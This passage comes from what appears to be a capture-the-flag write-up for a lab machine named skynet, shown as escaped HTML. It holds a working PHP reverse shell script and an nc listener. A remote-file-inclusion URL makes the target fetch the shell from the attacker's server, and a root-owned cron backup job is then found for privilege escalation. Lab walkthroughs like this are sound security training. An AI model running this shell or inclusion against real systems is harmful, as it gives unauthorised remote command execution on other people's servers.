&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$pid&lt;/span> &lt;span class="o">==&lt;/span> -1&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Can&amp;#39;t fork&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$pid&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span> // Parent exits
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>posix_setsid&lt;span class="o">()&lt;/span> &lt;span class="o">==&lt;/span> -1&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Error: Can&amp;#39;t setsid()&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$daemon&lt;/span> &lt;span class="o">=&lt;/span> 1&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;WARNING: Failed to daemonise. This is quite common and not fatal.&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chdir&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">umask&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// Open reverse connection
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sock&lt;/span> &lt;span class="o">=&lt;/span> fsockopen&lt;span class="o">(&lt;/span>&lt;span class="nv">$ip&lt;/span>, &lt;span class="nv">$port&lt;/span>, &lt;span class="nv">$errno&lt;/span>, &lt;span class="nv">$errstr&lt;/span>, 30&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>!&lt;span class="nv">$sock&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$errstr&lt;/span>&lt;span class="s2"> (&lt;/span>&lt;span class="nv">$errno&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$descriptorspec&lt;/span> &lt;span class="o">=&lt;/span> array&lt;span class="o">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">0&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; array&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>, // stdin is a pipe that the child will &lt;span class="nb">read&lt;/span> from
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">1&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; array&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>, // stdout is a pipe that the child will write to
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">2&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; array&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> // stderr is a pipe that the child will write to
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$process&lt;/span> &lt;span class="o">=&lt;/span> proc_open&lt;span class="o">(&lt;/span>&lt;span class="nv">$shell&lt;/span>, &lt;span class="nv">$descriptorspec&lt;/span>, &lt;span class="nv">$pipes&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>!is_resource&lt;span class="o">(&lt;/span>&lt;span class="nv">$process&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Can&amp;#39;t spawn shell&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Successfully opened reverse shell to &lt;/span>&lt;span class="nv">$ip&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="nv">$port&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>feof&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Shell connection terminated&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> break&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>feof&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Shell process terminated&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> break&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$read_a&lt;/span> &lt;span class="o">=&lt;/span> array&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, &lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$num_changed_sockets&lt;/span> &lt;span class="o">=&lt;/span> stream_select&lt;span class="o">(&lt;/span>&lt;span class="nv">$read_a&lt;/span>, &lt;span class="nv">$write_a&lt;/span>, &lt;span class="nv">$error_a&lt;/span>, null&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>in_array&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$read_a&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;SOCK READ&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> fread&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;SOCK: &lt;/span>&lt;span class="nv">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fwrite&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span>, &lt;span class="nv">$input&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>in_array&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, &lt;span class="nv">$read_a&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDOUT READ&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> fread&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDOUT: &lt;/span>&lt;span class="nv">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fwrite&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$input&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>in_array&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>, &lt;span class="nv">$read_a&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDERR READ&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> fread&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>, &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDERR: &lt;/span>&lt;span class="nv">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fwrite&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$input&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>0&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proc_close&lt;span class="o">(&lt;/span>&lt;span class="nv">$process&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> printit &lt;span class="o">(&lt;/span>&lt;span class="nv">$string&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>!&lt;span class="nv">$daemon&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$string&lt;/span>&lt;span class="s2">\n&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>start a python server &lt;code>python -m http.server 8000&lt;/code>&lt;/p>
&lt;p>then start a listener: &lt;code>nc -lvnp 444&lt;/code>&lt;/p>
&lt;p>now we go to this page:&lt;/p>
&lt;p>&lt;code>&amp;lt;machine_ip&amp;gt;/&amp;lt;redacted&amp;gt;/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.20.116:8000/php.php&lt;/code>&lt;/p>
&lt;p>And we have our reverse shell.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.34.11&lt;span class="o">]&lt;/span> &lt;span class="m">42912&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux skynet 4.8.0-58-generic &lt;span class="c1">#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 09:39:18 up 1:34, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.00, 0.00
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: cannot &lt;span class="nb">set&lt;/span> terminal process group &lt;span class="o">(&lt;/span>1459&lt;span class="o">)&lt;/span>: Inappropriate ioctl &lt;span class="k">for&lt;/span> device
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: no job control in this shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data@skynet:/$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>From here we can go to miles home directory and find the user flag.&lt;/p>
&lt;p>Now we want to get the root flag.&lt;/p>
&lt;p>after searching for a while, the only thing that seems interessing is this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/crontab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># /etc/crontab: system-wide crontab&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># command to install the new version when you edit this file&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># and files in /etc/cron.d. These files also have username fields,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># that none of the other crontabs do.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SHELL&lt;/span>&lt;span class="o">=&lt;/span>/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># m h dom mon dow user command&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*/1 * * * * root /home/milesdyson/backups/backup.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">17&lt;/span> * * * * root &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.hourly
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">25&lt;/span> &lt;span class="m">6&lt;/span> * * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.daily &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">47&lt;/span> &lt;span class="m">6&lt;/span> * * &lt;span class="m">7&lt;/span> root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.weekly &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">52&lt;/span> &lt;span class="m">6&lt;/span> &lt;span class="m">1&lt;/span> * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.monthly &lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>There is a backup running all minutes, and it is using root privileges.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
